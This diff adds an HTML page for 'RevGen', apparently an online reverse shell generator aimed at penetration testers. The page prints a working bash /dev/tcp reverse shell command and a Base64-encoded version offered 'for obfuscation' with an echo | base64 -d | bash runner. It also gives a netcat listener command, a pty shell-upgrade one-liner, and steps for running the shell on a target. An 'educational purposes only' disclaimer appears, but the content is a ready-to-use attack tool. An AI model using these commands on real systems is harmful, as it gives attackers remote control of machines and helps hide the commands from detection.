@@ -1,0 +1,265 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>RevGen - Online Reverse Shell Generator</title>
+    <meta name="description" content="A modern reverse shell command generator with multiple shell options. Generate reverse shell commands for penetration testing and security research." />
+    <meta name="author" content="RevGen" />
+
+    <meta property="og:title" content="RevGen - Online Reverse Shell Generator" />
+    <meta property="og:description" content="A modern reverse shell command generator with multiple shell options. Generate reverse shell commands for penetration testing and security research." />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://killed.cfd" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@zSec" />
+    <meta name="twitter:image" content="https://killed.cfd" />
+    
+    <link rel="stylesheet" href="./styles.css" />
+    <!-- Font for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+  </head>
+  <body class="bg-dark text-foreground">
+    <header class="py-6 px-4 border-b border-neon-green-20">
+      <div class="container mx-auto flex justify-between items-center">
+        <div class="flex items-center gap-2">
+          <i class="fas fa-terminal text-neon-green text-2xl"></i>
+          <h1 class="text-3xl font-bold text-neon-green animate-glow">RevGen</h1>
+        </div>
+        <div class="font-mono text-sm text-neon-green-70">
+          <span class="hidden md:inline">Simple.</span> Secure. <span class="hidden md:inline">Powerful.</span>
+        </div>
+      </div>
+    </header>
+    
+    <main class="flex-grow">
+      <div class="container mx-auto px-4 py-8">
+        <section class="mb-12 text-center">
+          <h1 class="text-2xl md:text-4xl font-bold mb-4 text-neon-green">
+            Reverse Shell Command Generator
+          </h1>
+          <p class="text-lg text-muted-foreground max-w-2xl mx-auto">
+            Generate reverse shell commands for multiple platforms with customizable parameters.
+            Simple, secure, and ready for your penetration testing needs.
+          </p>
+          
+          <div class="mt-8 grid grid-cols-1 md:grid-cols-3 gap-6 max-w-3xl mx-auto">
+            <div class="feature-card">
+              <i class="fas fa-terminal text-neon-green mb-2 text-3xl"></i>
+              <h3 class="text-lg font-medium mb-1">Multiple Shells</h3>
+              <p class="text-muted-foreground text-sm text-center">
+                Support for Bash, Python, Perl, PHP, Netcat, and PowerShell
+              </p>
+            </div>
+            
+            <div class="feature-card">
+              <i class="fas fa-bolt text-neon-blue mb-2 text-3xl"></i>
+              <h3 class="text-lg font-medium mb-1">Instant Generation</h3>
+              <p class="text-muted-foreground text-sm text-center">
+                Real-time command generation with copy to clipboard
+              </p>
+            </div>
+            
+            <div class="feature-card">
+              <i class="fas fa-shield-alt text-neon-purple mb-2 text-3xl"></i>
+              <h3 class="text-lg font-medium mb-1">Base64 Encoding</h3>
+              <p class="text-muted-foreground text-sm text-center">
+                Obfuscate commands with automatic Base64 encoding
+              </p>
+            </div>
+          </div>
+        </section>
+        
+        <div class="bg-dark-secondary border border-neon-green-20 rounded-lg p-6">
+          <h2 class="text-xl md:text-2xl font-bold mb-6 text-center text-neon-green">Reverse Shell Command Generator</h2>
+          
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+            <div class="space-y-2">
+              <label for="ip" class="text-sm font-medium">IP Address / Host</label>
+              <div class="flex items-center space-x-2">
+                <i class="fas fa-server text-muted-foreground"></i>
+                <input
+                  id="ip"
+                  value="10.0.0.1"
+                  placeholder="Enter IP Address"
+                  class="input-field"
+                />
+              </div>
+            </div>
+            
+            <div class="space-y-2">
+              <label for="port" class="text-sm font-medium">Port</label>
+              <div class="flex items-center space-x-2">
+                <i class="fas fa-network-wired text-muted-foreground"></i>
+                <input
+                  id="port"
+                  value="4444"
+                  placeholder="Enter Port"
+                  class="input-field"
+                />
+              </div>
+            </div>
+            
+            <div class="space-y-2">
+              <label class="text-sm font-medium">Protocol</label>
+              <div class="flex space-x-4">
+                <div class="flex items-center space-x-2">
+                  <input type="radio" name="protocol" id="tcp" value="tcp" checked class="radio-input" />
+                  <label for="tcp" class="text-sm">TCP</label>
+                </div>
+                <div class="flex items-center space-x-2">
+                  <input type="radio" name="protocol" id="udp" value="udp" class="radio-input" />
+                  <label for="udp" class="text-sm">UDP</label>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="mb-8">
+            <label class="text-sm font-medium mb-2 block">Shell Type</label>
+            <div class="flex flex-wrap gap-2">
+              <button class="shell-option active" data-shell="bash">
+                <i class="fas fa-terminal"></i>
+                <span>Bash</span>
+              </button>
+              <button class="shell-option" data-shell="python">
+                <i class="fas fa-terminal"></i>
+                <span>Python</span>
+              </button>
+              <button class="shell-option" data-shell="perl">
+                <i class="fas fa-terminal"></i>
+                <span>Perl</span>
+              </button>
+              <button class="shell-option" data-shell="php">
+                <i class="fas fa-terminal"></i>
+                <span>PHP</span>
+              </button>
+              <button class="shell-option" data-shell="netcat">
+                <i class="fas fa-network-wired"></i>
+                <span>Netcat</span>
+              </button>
+              <button class="shell-option" data-shell="powershell">
+                <i class="fas fa-terminal"></i>
+                <span>PowerShell</span>
+              </button>
+            </div>
+          </div>
+          
+          <div class="tabs">
+            <div class="tabs-list">
+              <button class="tab active" data-tab="raw">Raw Command</button>
+              <button class="tab" data-tab="encoded">Base64 Encoded</button>
+            </div>
+            
+            <div class="tab-content active" data-tab-content="raw">
+              <div class="card">
+                <div class="code-block relative group">
+                  <pre id="rawCommand" class="terminal-text pr-8">bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</pre>
+                  <div class="copy-button-container">
+                    <button class="copy-button" data-target="rawCommand">
+                      <i class="fas fa-copy"></i>
+                    </button>
+                  </div>
+                </div>
+                
+                <div class="p-4 text-xs text-muted-foreground">
+                  <p class="flex items-center gap-2">
+                    <i class="fas fa-cog text-xs"></i>
+                    Adjust parameters above to customize the command
+                  </p>
+                </div>
+              </div>
+            </div>
+            
+            <div class="tab-content" data-tab-content="encoded">
+              <div class="card">
+                <div class="code-block relative group">
+                  <pre id="encodedCommand" class="terminal-text pr-8">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=</pre>
+                  <div class="copy-button-container">
+                    <button class="copy-button" data-target="encodedCommand">
+                      <i class="fas fa-copy"></i>
+                    </button>
+                  </div>
+                </div>
+                
+                <div class="p-4 text-xs flex justify-between items-center">
+                  <span class="text-muted-foreground">
+                    Base64 encoded command for obfuscation
+                  </span>
+                  <span class="text-xs terminal-text">
+                    echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="mt-6 p-4 bg-dark-secondary border border-yellow-600-20 rounded-md">
+            <p class="text-yellow-400 text-sm flex items-start gap-2">
+              <span class="text-yellow-400 font-bold">!</span>
+              <span>For educational purposes only.</span>
+            </p>
+          </div>
+        </div>
+        
+        <section class="mt-12 max-w-3xl mx-auto">
+          <h2 class="text-xl font-bold mb-4 text-neon-green">Usage Instructions</h2>
+          
+          <div class="space-y-4 text-sm">
+            <div class="bg-dark-secondary border border-neon-green-20 p-4 rounded-lg">
+              <h3 class="font-medium mb-2 text-neon-blue">1. Configure your listener</h3>
+              <div class="code-block">
+                <pre class="terminal-text">nc -lvnp 4444</pre>
+              </div>
+              <p class="mt-2 text-muted-foreground">
+                Start a netcat listener on your attacking machine to receive the connection.
+              </p>
+            </div>
+            
+            <div class="bg-dark-secondary border border-neon-green-20 p-4 rounded-lg">
+              <h3 class="font-medium mb-2 text-neon-blue">2. Execute the shell</h3>
+              <p class="text-muted-foreground mb-2">
+                Run the generated command on the target system to establish the connection.
+              </p>
+            </div>
+            
+            <div class="bg-dark-secondary border border-neon-green-20 p-4 rounded-lg">
+              <h3 class="font-medium mb-2 text-neon-blue">3. Upgrade your shell (optional)</h3>
+              <div class="code-block">
+                <pre class="terminal-text">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+              </div>
+              <p class="mt-2 text-muted-foreground">
+                For a more stable and feature-rich shell experience.
+              </p>
+            </div>
+          </div>
+        </section>
+      </div>
+    </main>
+    
+    <footer class="py-6 px-4 mt-12 border-t border-neon-green-20">
+      <div class="container mx-auto">
+        <div class="flex flex-col md:flex-row justify-between items-center gap-4">
+          <div class="text-sm text-muted-foreground">
+            <p>© <span id="currentYear"></span> Made by zSec.</p>
+          </div>
+          <div class="flex items-center gap-4">
+            <a href="#" class="text-muted-foreground hover:text-neon-green">
+              <i class="fab fa-github"></i>
+            </a>
+            <a href="#" class="text-muted-foreground hover:text-neon-green">
+              <i class="fas fa-shield-alt"></i>
+            </a>
+          </div>
+        </div>
+        <div class="mt-4 text-xs text-muted-foreground text-center md:text-left">
+          <p>Disclaimer: This tool is designed for educational purposes only.</p>
+        </div>
+      </div>
+    </footer>
+
+    <script src="./script.js"></script>
+  </body>
+</html>
